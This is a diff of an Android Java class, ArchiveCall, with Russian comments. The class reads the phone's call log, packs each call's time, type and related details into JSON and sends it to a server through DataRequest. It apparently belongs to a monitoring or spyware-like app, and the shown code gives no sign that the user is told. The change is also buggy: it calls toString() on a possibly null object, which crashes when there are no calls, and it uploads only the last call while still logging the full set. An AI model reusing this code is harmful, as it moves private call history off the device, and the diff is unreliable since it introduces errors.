@@ -20,7 +20,7 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	private int iType = 0;
 	ConvertDate date;
 	private String LOG_TAG = "ArchiveCall";
-
+	
 	private String getDuration(long milliseconds) {
 		int seconds = (int) (milliseconds / 1000) % 60; // 280
 		int minutes = (int) ((milliseconds / (1000 * 60)) % 60);
@@ -33,7 +33,7 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 	private String readCallLogs() {
 
 		// Вставляем контакты
-		Logging.doLog(LOG_TAG ,"Insert: ", "Inserting ..");
+		Logging.doLog(LOG_TAG, "Insert: ", "Inserting ..");
 		// формируем JSONobj
 		JSONObject AllCallJson = new JSONObject();
 		date = new ConvertDate();
@@ -45,6 +45,9 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 				android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
 
 		if (callLogCursor != null) {
+			JSONObject archiveCallJson = null;
+			JSONObject infoCallJson;
+
 			// Проходим в цикле, пока не дойдём до последней записи
 			Logging.doLog(LOG_TAG, "callogCursor != 0 ..");
 
@@ -92,8 +95,8 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 				// + dateString + " " + duration + " " + callType + " "
 				// + isNew);
 				try {
-					JSONObject archiveCallJson = new JSONObject();
-					JSONObject infoCallJson = new JSONObject();
+					archiveCallJson = new JSONObject();
+					infoCallJson = new JSONObject();
 
 					archiveCallJson.put("time", dateString);
 					archiveCallJson.put("type", iType);
@@ -108,9 +111,9 @@ public class ArchiveCall extends AsyncTask<Context, Void, Void> {
 			}
 			callLogCursor.close();
 
-			if (AllCallJson != null) {
+			if (archiveCallJson.toString() != null) {
 				DataRequest dr = new DataRequest(mContext);
-				dr.sendRequest(AllCallJson.toString());
+				dr.sendRequest(archiveCallJson.toString());
 				Logging.doLog(LOG_TAG, AllCallJson.toString());
 			}
 		}
